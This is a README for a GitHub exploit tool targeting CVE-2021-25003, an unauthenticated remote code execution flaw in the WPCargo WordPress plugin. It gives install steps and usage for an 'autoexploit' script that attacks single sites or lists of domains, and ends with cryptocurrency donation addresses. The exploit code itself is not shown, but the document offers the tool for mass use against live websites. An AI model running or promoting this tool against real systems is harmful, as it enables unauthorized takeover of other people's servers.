# CVE-2021-25003
[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)

```
Title: WPCargo < 6.9.0 - Unauthenticated RCE
Author: Krzysztof Zając [ https://kazet.cc/ ]
CVE: CVE-2021-25003
```

### Installation
```
git clone https://github.com/biulove0x/CVE-2021-25003.git
cd CVE-2021-25003/
python3 -m pip install -r requirements.txt
```

### How to run autoexploit
```
$ python3 WpCargo.py --help
############################################
# @author : biulove0x                      #
# @name   : WP Plugins WPCargo Exploiter   #
# @cve    : CVE-2021-25003                 #
############################################

usage: exploit.py [-h] [-t example.com] [-l target.txt]

CVE-2021-25003 [ WPCargo < 6.9.0 - Unauthenticated RCE ]

optional arguments:
  -h, --help      show this help message and exit
  -t example.com  Single target
  -l target.txt   Multiple target
```

#### Single target
```
$ python3 WPCargo.py -t http://example.com/
```

#### Multiple target
```
$ cat domains.txt
http://example.com/
https://examples.com/

$ python3 WPCargo.py -l target.txt
```

### References :

* https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a

### Donate :
BTC : bc1qst09sxcnq97a4wgsqvpkg4fxyjczvs3xe7278h

BNB : bnb1jhp2hv9utr8u97387p35fmftgr8wpjp39altz0

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/biulove0x)
